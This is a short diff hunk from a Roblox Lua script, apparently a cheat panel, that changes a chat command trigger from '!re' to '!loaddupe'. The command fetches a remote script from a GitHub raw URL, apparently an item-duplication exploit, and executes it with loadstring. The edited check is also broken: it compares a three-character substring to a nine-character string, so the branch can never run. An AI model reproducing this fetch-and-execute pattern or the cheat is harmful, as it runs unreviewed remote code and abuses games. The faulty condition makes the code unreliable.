@@ -964,7 +964,7 @@ TextButton.MouseButton1Down:connect(function()
 			end
 		end
 
-		if message:sub(1,3) == "!re" then
+		if message:sub(1,3) == "!loaddupe" then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ware11/dupe1/main/DUPE.GRIPS"))();
 		end
 
